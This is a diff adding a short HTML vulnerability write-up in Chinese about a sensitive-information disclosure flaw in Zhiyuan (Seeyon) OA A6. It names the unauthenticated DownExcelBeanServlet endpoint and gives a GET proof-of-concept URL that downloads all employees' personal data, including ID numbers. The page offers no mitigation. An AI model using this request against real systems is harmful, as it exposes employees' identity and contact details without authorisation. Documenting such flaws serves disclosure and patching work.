@@ -1,0 +1,40 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs1C2E50E7{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="致远oa-a6-敏感信息泄露（二）"><span class="csECDA2D3">致远</span><span class="csDE05BCC">OA A6 </span><span class="csECDA2D3">敏感信息泄露（二）</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">致远</span><span class="cs8926E06">OA A6</span></p><h2 class="cs868C439D">
+			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<h5 class="cs868C439D">
+			<a name="漏洞位置"><span class="cs1C2E50E7">漏洞位置</span><span class="cs4B51D5E4">:</span></a></h5>
+		<p class="cs3A447A38"><span class="cs9FB05234">http://www.0-sec.org/yyoa/DownExcelBeanServlet</span></p><h5 class="cs868C439D">
+			<a name="漏洞详情"><span class="cs1C2E50E7">漏洞详情</span><span class="cs4B51D5E4">:</span></a></h5>
+		<p class="cs3A447A38"><span class="cs7FFD2630">版本</span><span class="cs9FB05234">:A6</span><span class="cs7FFD2630">只有系统管理才有的权限，但是任意用户都可以访问。可以下载所有员工的个人信息，包括身份证、联系方式、职位等敏感信息。</span></p><h5 class="cs868C439D">
+			<a name="请求方式"><span class="cs1C2E50E7">请求方式</span><span class="cs4B51D5E4">:</span></a></h5>
+		<p class="cs3A447A38"><span class="cs9FB05234">Get</span></p><h5 class="cs868C439D">
+			<a name="poc"><span class="cs4B51D5E4">POC:</span></a></h5>
+		<p class="cs3A447A38"><span class="cs9FB05234">http://www.0-sec.org/yyoa/DownExcelBeanServlet?contenttype=username&amp;contentvalue=&amp;state=1&amp;per_id=</span></p></body>
+</html>
